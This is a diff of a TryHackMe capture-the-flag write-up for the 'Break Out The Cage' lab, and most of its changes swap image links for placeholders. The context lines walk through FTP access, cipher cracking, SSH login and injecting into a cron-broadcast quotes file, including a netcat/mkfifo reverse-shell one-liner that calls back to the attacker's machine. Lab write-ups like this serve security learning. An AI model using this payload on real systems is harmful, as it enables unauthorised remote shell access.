@@ -3,7 +3,7 @@
 
 <p align="center">
 <img
-src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/room%20icon.jpeg" alt="image alt" width="180" />
+src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Red-Team/Break-Out-The-Cage/Images/room%20icon.jpeg" alt="image alt" width="180" />
 </p>
 
 [![Day 29 of 30 – Hack Documentation Challenge](https://img.shields.io/badge/Day%2029%20of%2030-Hack%20Documentation%20Challenge-crimson?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
@@ -33,29 +33,29 @@ Two things stood out immediately:
 
 Checking out the HTTP service brought me to a static web page where Mr. Cage appeared to share updates with his fans. The page didn’t have working navigation links, but its source code included a few images and hardcoded references that felt worth keeping in mind for later.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%201.png)
+![Alt text](1)
 
 Since anonymous login was allowed, I connected to the FTP server and found a single file named `dad_tasks`. I downloaded it using:
 ```
 get dad_tasks
 ```
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%202.png)
+![Alt text](2)
 
 Opening the file showed Base64-encoded text. After decoding, the result still looked scrambled, indicating it was likely encrypted or encoded again.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%203.png)
+![Alt text](3)
 
 To further investigate the scrambled output from the `dad_tasks` file, I ran it through an online cipher identifier. The tool recognized the text as a Vigenère cipher, which I was able to decode successfully. The plaintext not only contained some funny “Dad’s Tasks,” but also revealed Weston’s password.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%204.png)
+![Alt text](4)
 
 Using the recovered credentials, I logged into Weston’s account via SSH:
 ```
 ssh weston@10.201.18.31
 ```
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%205.png)
+![Alt text](5)
 
 I began basic enumeration to identify other local users and check for potential privilege escalation paths.
 
@@ -74,7 +74,7 @@ The output revealed Weston could run `/usr/bin/bees` as root. Executing it displ
 "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
 ```
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%206.png)
+![Alt text](6)
 
 I checked group memberships using:
 ```
@@ -91,25 +91,25 @@ find / -group cage 2>/dev/null
 Among the results, one file stood out:
 `/opt/.dads_scripts/spread_the_quotes.py`, a Python script responsible for the periodic broadcast quotes.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%207.png)
+![Alt text](7)
 
 Opening `/opt/.dads_scripts/spread_the_quotes.py` revealed a short Python script that reads all lines from `/opt/.dads_scripts/.files/.quotes`, randomly selects one, and then uses the `wall` command to broadcast it to all logged-in users.
 
 
 This means that anything placed into `.quotes` would be executed by `wall`, giving us a potential code execution vector.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%208.png)
+![Alt text](8)
 
 Knowing I could inject commands, I looked up a Pentestmonkey Netcat reverse shell payload and set up a listener on my attack machine on port `4563`:
 ```
 nc -lvnp 4563
 ```
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%209.png)
+![Alt text](9)
 
 Opening `/opt/.dads_scripts/.files/.quotes` showed a long list of quotes, matching the ones broadcasted every few minutes by the script.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%2010.png)
+![Alt text](10)
 
 To hijack the broadcast process, I overwrote the `.quotes` file with my payload:
 ```
@@ -120,7 +120,7 @@ echo "hello;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.201.18.126 
 
 After a moment, the scheduled script executed and I caught a reverse shell, now running as the user `cage`.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%2011.png)
+![Alt text](11)
 
 To make the reverse shell more usable, I upgraded it to a fully interactive TTY:
 
@@ -131,29 +131,29 @@ export TERM=xterm
 
 On the user home directory lay a `email_backup` folder & a `Super_Duper_Checklist` file. The `Super_Duper_Checklist file` included the first THM flag.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%2012.png)
+![Alt text](12)
 
 Reading through the emails in `email_backup` revealed clues for escalating privileges, confirming that Cage was not running as root.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%2013.png)
+![Alt text](13)
 
 One email in particular, `email_3`, contained a string that looked like a ciphered password and repeated the word  `face` way too many times.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%2014.png)
+![Alt text](14)
 
 Using an online cipher identifier, I determined the string was encrypted with a Vigenère cipher. The key was `face`, and decoding it revealed the root user’s password.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%2015.png)
+![Alt text](15)
 
 Using the `su -` to change to the root user, along with the discovered password, successfully gave full root privileges.
 
 In the root directory, there was another `email_backup` folder containing several more emails.
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%2016.png)
+![Alt text](16)
 
 Reading through the emails we find that Cage was in fact not being paranoid about his agent, he was in fact praying for his downfall. Amongst the theatrics was the root flag!
 
-![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Break-Out-The-Cage/Images/Screenshot%2017.png)
+![Alt text](17)
 
 <p align="center">+</p>
 
